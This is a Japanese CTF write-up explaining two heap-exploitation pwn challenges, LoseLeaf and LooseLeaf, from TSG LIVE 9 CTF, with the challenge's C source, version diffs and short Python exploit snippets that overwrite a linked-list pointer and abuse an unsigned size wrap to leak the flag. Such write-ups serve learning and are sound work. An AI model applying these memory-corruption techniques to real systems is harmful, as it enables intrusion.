# 結果
2022/11/19に行われたTSG LIVE 9 CTFに、Float Lariatとして出てきました。
頑張って、頑張った結果、一位を取れました。嬉しいね。

僕が解いた問題は

- LoseLeaf(pwn)
- LooseLeaf(pwn)

の二問だけなんでその解説します。

## LoseLeaf(pwn)

以下のソースコードと、バイナリが渡されます。

checksec
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

ソースコード

<details>

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define N_NOTES 10
#define BUF_SIZE 40

char flag[100]; // Can you read me?

typedef struct Page {
    struct Page *next;
    char content[];
} Page;
Page *notes[N_NOTES];

void die(const char *msg) {
    puts(msg);
    exit(1);
}

unsigned get_int() {
    unsigned x;
    scanf("%u", &x);
    return x;
}

void readn(char *buf, unsigned size) {
    unsigned cnt = 0;
    for (unsigned i = 0; i < size; i++) {
        unsigned x = read(0, buf + i, 1);
        cnt += x;
        if (x != 1 || buf[cnt - 1] == '\n') break;
    }
    if (cnt == 0) exit(-1);
    if (buf[cnt - 1] == '\n') buf[cnt - 1] = '\x00';
}

void init() {
    alarm(60);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

unsigned get_note_index(const char* msg) {
    printf("%s: ", msg);
    unsigned idx = get_int();
    if (idx >= N_NOTES) die("invalid choice");
    return idx;
}

unsigned page_menu() {
    puts("1. add page");
    puts("2. delete page");
    puts("3. back to main menu");
    printf("> ");
    return get_int();
}

unsigned main_menu() {
    puts("1. modify note");
    puts("2. concat notes");
    puts("3. print note");
    printf("> ");
    return get_int();
}

void add_page(unsigned note_idx) {
    printf("index: ");
    unsigned idx = get_int();

    Page **cur = &notes[note_idx];
    for (int i = 0; i < idx; i++) {
        if (*cur == NULL) die("invalid index");
        cur = &(*cur)->next;
    }
    Page *next = *cur;

    printf("size: ");
    unsigned size = get_int();
    Page *page = (Page *)malloc(size + 8);
    page->next = next;
    printf("data: ");
    readn(page, size);
    *cur = page;
}

void delete_page(unsigned note_idx) {
    printf("index: ");
    unsigned idx = get_int();

    Page **cur = &notes[note_idx];
    for (int i = 0; i < idx; i++) {
        if (*cur == NULL) die("invalid index");
        cur = &(*cur)->next;
    }
    if (*cur == NULL) die("invalid index");
    Page *next = (*cur)->next;
    free(*cur);
    *cur = next;
}

void page_main(unsigned note_idx) {
    while (1) {
        switch (page_menu()) {
            case 1:
                add_page(note_idx); break;
            case 2:
                delete_page(note_idx); break;
            default:
                return;
        }
    }
}

void concat_notes(unsigned idx1, unsigned idx2, unsigned idx3) {
    notes[idx3] = notes[idx1];
    Page **cur = &notes[idx3];
    while(*cur != NULL) {
        cur = &(*cur)->next;
    }
    *cur = notes[idx2];
    notes[idx1] = NULL;
    notes[idx2] = NULL;
}

void print_note(unsigned idx) {
    Page **cur = &notes[idx];
    while(*cur != NULL) {
        printf("%s\n", (*cur)->content);
        puts("\n------------\n"); 
        cur = &(*cur)->next;
    }
}
    
int main(void) {
    init();
    unsigned idx1, idx2, idx3;
    int fd = open("flag.txt", O_RDONLY);
    int r = read(fd, flag, 99);
    if (r <= 0) die("ask admin");
    close(fd);
    while (1) {
        switch (main_menu()) {
            case 1:
                page_main(get_note_index("note index")); break;
            case 2: 
                idx1 = get_note_index("note index 1");
                idx2 = get_note_index("note index 2");
                idx3 = get_note_index("note index 3");
                concat_notes(idx1, idx2, idx3); break;
            case 3:
                print_note(get_note_index("note index")); break;
            default:
                return 0;
        }
    }
    return 0;
}
```

</details>

簡単なメモアプリっぽいですね。
グローバルな `notes` に先頭ポインタが40個入っていて、そこから next を手繰っていくアプリケーションです。

さて、この問題はpwn全三問シリーズの一問目で、二問目はこの問題のセキュリティにパッチを当てたらしいことが仄めかされています。そこで diff を使ってソースコードを比較することにしました。

diff
```
85c85
<     readn(page, size);
---
>     readn(page->content, size);
```

add_page 内の readn が修正されているようです。上の場合、page に入力が入るので、nextが変更できてしまうことがわかります。これではいけませんね。
ということで、入力にflagが入ったポインタ-8を入れ、contentがflagを指すようにしたところ、取れました。

exploit.py
```python
io.sendline(b'0')
io.sendline(b'1')
io.sendline(b'0')
io.sendline(str(0x20).encode())
io.sendline(pack(binary.symbols['flag'] - 8))
```

あとはこれで index=0 を print します。

## LooseLeaf(pwn)

checksec
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

同じように二問目と三問目でdiffを取ると、

```
81a82
>     if (size > 0x500) die("your buffer is too big");
```

何やらサイズチェックが入っているのがわかります。

mallocに入れる値だからチェックしても変わらなさそうだなぁと思いつつよく見てみると、sizeの型がunsignedなことに気が付きます。

もし `size = get_int()` が -8 を返してきた場合、unsigned な型に入るので、オーバーフローして 4294967288 になります。

size + 8 は 0 なので、malloc は 適当なポインタを取ってきますが、readn に渡される size が大きいので、ヒープのバッファオーバーフローが発生します。

その操作を broken_alloc として、

```
idx0 = alloc(0x8)
deallocate(idx0) // tcache(0x8) -> idx0

idx1 = alloc(0x100)
idx2 = broken_alloc() // tcache(0x8)
``

の順番で操作をすると、broken_alloc で取ってきた下の領域に alloc(1) のデータがあるので、next を flag - 8 にして print すれば取れます。

exploit.py
```python
modify_note(0)
add_page(0, 0x8, b'normal1')
delete_page(0)
add_page(0, 0x100, b'big!')

add_page(0, ctypes.c_uint32(-8).value, pack(0xdeadbeef) + pack(0xcafebabe) + pack(0x11111111) + pack(binary.symbols['flag'] - 8))
```

# 感想
自明な脆弱性からちょっと一手間で解ける感じの問題で楽しかった。
LoooseLeft(3問目)も通したかった
